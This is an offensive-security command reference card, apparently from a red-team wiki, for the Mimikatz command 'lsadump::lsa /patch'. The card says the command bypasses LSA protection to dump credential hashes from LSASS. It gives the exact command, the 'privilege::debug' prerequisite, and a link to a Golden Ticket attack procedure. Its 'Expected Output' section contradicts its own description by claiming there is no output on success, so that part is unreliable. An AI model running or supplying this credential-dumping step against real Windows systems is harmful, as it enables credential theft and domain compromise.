---
id: 00000000-0000-0000-0000-000000000001
name: mimikatz-lsadump-lsa-patch
type: command
executor: cmd
data: 'lsadump::lsa /patch'
output: null
created_at: '2023-04-06T03:56:04.701601+00:00'
updated_at: '2023-04-10T20:26:19.932156+00:00'
platforms:
  - Windows
tags:
  - mimikatz
  - lsa
verified: true
validated: true
---

# mimikatz-lsadump-lsa-patch

## Command

```cmd
lsadump::lsa /patch
```

## Description

This Mimikatz command applies a patch to the Local Security Authority (LSA) in memory, disabling protections to allow extraction of credential hashes from LSASS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /patch | Applies the LSA protection bypass patch | Yes |

## Examples

### Basic Usage

```cmd
lsadump::lsa /patch
```

Run after elevating Mimikatz with `privilege::debug`.

## Expected Output

Patch applied successfully, no output if successful; errors if LSA protection is enforced (e.g., Credential Guard enabled).

## Related

- [[procedures/Golden-Ticket-Attack-with-Mimikatz]]
- [[tools/Mimikatz]]
